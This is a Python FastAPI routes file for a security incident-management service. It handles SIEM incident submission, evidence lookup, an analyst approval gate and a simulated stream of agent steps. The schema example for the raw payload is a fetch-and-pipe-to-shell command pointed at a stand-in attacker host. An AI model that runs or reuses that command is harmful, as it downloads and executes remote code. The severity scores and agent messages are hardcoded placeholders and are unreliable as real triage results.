"""
src/api/rest/routes/incidents.py
=================================
Core Incident Management endpoints:
  - Incident submission (SIEM webhooks)
  - Incident state & evidence graph query
  - Human-in-the-Loop (HITL) approval gate
  - Server-Sent Events (SSE) live agent activity stream
"""

import asyncio
from datetime import datetime, timezone
import json
from typing import Any, Dict, List, Optional
import uuid
from fastapi import APIRouter, Depends, HTTPException, Path, status
from pydantic import BaseModel, Field
from sse_starlette.sse import EventSourceResponse
import structlog

from src.api.rest.middleware.auth import User, get_current_user, require_role

logger = structlog.get_logger(__name__)

router = APIRouter(prefix="/api/v1/incidents", tags=["Incidents"])

# In-memory storage of active incidents (linked to LangGraph / Redis in Phase 4-6)
INCIDENT_STORE: Dict[str, Dict[str, Any]] = {}


# --- Request & Response Models ---

class IncidentSubmitRequest(BaseModel):
    source_ip: str = Field(..., description="Source / Attacker IP", json_schema_extra={"example": "192.168.1.105"})
    destination_ip: str = Field(..., description="Target Host IP", json_schema_extra={"example": "10.0.0.12"})
    hostname: str = Field(..., json_schema_extra={"example": "prod-app-server-01"})
    event_type: str = Field(..., json_schema_extra={"example": "MALWARE_EXECUTION"})
    raw_payload: str = Field(..., json_schema_extra={"example": "curl -s http://attacker.com/payload.sh | bash"})
    metadata: Dict[str, Any] = Field(default_factory=dict)


class IncidentResponse(BaseModel):
    incident_id: str
    status: str                         # "TRIAGING", "WAITING_APPROVAL", "RESOLVED", "REJECTED"
    severity_score: float               # 0.0 to 10.0
    triage_verdict: Optional[str] = None
    mitre_tactics: List[str] = []
    forensic_evidence: List[Dict[str, Any]] = []
    remediation_plan: Optional[str] = None
    created_at: str
    updated_at: str


class ApprovalDecisionRequest(BaseModel):
    decision: str = Field(..., pattern="^(APPROVED|REJECTED|MODIFIED)$", json_schema_extra={"example": "APPROVED"})
    analyst_notes: Optional[str] = Field(default="", json_schema_extra={"example": "Approved firewall block for source IP"})
    modified_plan: Optional[str] = None


class ApprovalResponse(BaseModel):
    incident_id: str
    status: str
    approved_by: str
    timestamp: str
    message: str


# --- Endpoints ---

@router.post("/submit", response_model=IncidentResponse, status_code=status.HTTP_201_CREATED)
async def submit_incident(
    payload: IncidentSubmitRequest,
    current_user: User = Depends(get_current_user)
):
    """
    Submit an incident for autonomous investigation (SIEM webhook ingress).
    """
    incident_id = f"inc-{datetime.now(timezone.utc).strftime('%Y%m%d')}-{uuid.uuid4().hex[:6]}"
    now_iso = datetime.now(timezone.utc).isoformat()

    incident_record = {
        "incident_id": incident_id,
        "status": "TRIAGING",
        "severity_score": 7.5,
        "triage_verdict": "SUSPICIOUS",
        "mitre_tactics": ["TA0002: Execution", "TA0011: Command and Control"],
        "forensic_evidence": [
            {"type": "NETWORK_CONNECTION", "remote_ip": payload.source_ip, "port": 443},
            {"type": "RAW_LOG", "content": payload.raw_payload}
        ],
        "remediation_plan": f"Block outbound traffic to {payload.source_ip} and isolate host {payload.hostname}",
        "created_at": now_iso,
        "updated_at": now_iso,
        "submitted_by": current_user.username,
        "raw_event": payload.model_dump()
    }

    INCIDENT_STORE[incident_id] = incident_record
    logger.info("incident_submitted", incident_id=incident_id, submitted_by=current_user.username)

    return IncidentResponse(**incident_record)


@router.get("/{incident_id}", response_model=IncidentResponse)
async def get_incident(
    incident_id: str = Path(..., examples=["inc-20261124-abc123"]),
    current_user: User = Depends(get_current_user)
):
    """
    Retrieve current status, evidence graph, and remediation proposals for an incident.
    """
    incident = INCIDENT_STORE.get(incident_id)
    if not incident:
        raise HTTPException(
            status_code=status.HTTP_404_NOT_FOUND,
            detail=f"Incident '{incident_id}' not found"
        )
    return IncidentResponse(**incident)


@router.post("/{incident_id}/approval", response_model=ApprovalResponse)
async def submit_hitl_approval(
    incident_id: str,
    decision_req: ApprovalDecisionRequest,
    current_user: User = Depends(require_role("analyst"))
):
    """
    Human-in-the-Loop (HITL) Gate: Analyst approves, modifies, or rejects remediation commands.
    """
    incident = INCIDENT_STORE.get(incident_id)
    if not incident:
        raise HTTPException(
            status_code=status.HTTP_404_NOT_FOUND,
            detail=f"Incident '{incident_id}' not found"
        )

    now_iso = datetime.now(timezone.utc).isoformat()
    new_status = "EXECUTING_REMEDIATION" if decision_req.decision == "APPROVED" else "REMEDIATION_REJECTED"

    incident["status"] = new_status
    incident["updated_at"] = now_iso
    incident["approved_by"] = current_user.username
    incident["analyst_notes"] = decision_req.analyst_notes

    if decision_req.decision == "MODIFIED" and decision_req.modified_plan:
        incident["remediation_plan"] = decision_req.modified_plan

    logger.info(
        "hitl_decision_recorded",
        incident_id=incident_id,
        decision=decision_req.decision,
        analyst=current_user.username
    )

    return ApprovalResponse(
        incident_id=incident_id,
        status=new_status,
        approved_by=current_user.username,
        timestamp=now_iso,
        message=f"Human-in-the-loop decision '{decision_req.decision}' applied successfully."
    )


@router.get("/{incident_id}/stream")
async def stream_incident_updates(
    incident_id: str,
    current_user: User = Depends(get_current_user)
):
    """
    Server-Sent Events (SSE) endpoint: streams real-time agent progression events to the UI.
    """
    if incident_id not in INCIDENT_STORE:
        raise HTTPException(
            status_code=status.HTTP_404_NOT_FOUND,
            detail=f"Incident '{incident_id}' not found"
        )

    async def event_generator():
        # Simulated live agent transitions for demonstration
        steps = [
            {"node": "SUPERVISOR", "msg": f"Dispatched investigation for {incident_id}"},
            {"node": "TRIAGE", "msg": "Assigned severity score 7.5; MITRE tactics identified"},
            {"node": "FORENSICS", "msg": "Executing memory dump inspection in Docker sandbox"},
            {"node": "THREAT_INTEL", "msg": "Hybrid RAG match: Known C2 IP pattern found in Qdrant"},
            {"node": "CRITIC", "msg": "Evidence corroborates triage verdict with 98% confidence"},
            {"node": "HITL_GATE", "msg": "Remediation plan generated. Paused for Analyst approval"}
        ]
        for step in steps:
            yield {
                "event": "agent_step",
                "data": json.dumps({
                    "incident_id": incident_id,
                    "timestamp": datetime.now(timezone.utc).isoformat(),
                    **step
                })
            }
            await asyncio.sleep(0.05)

    return EventSourceResponse(event_generator())
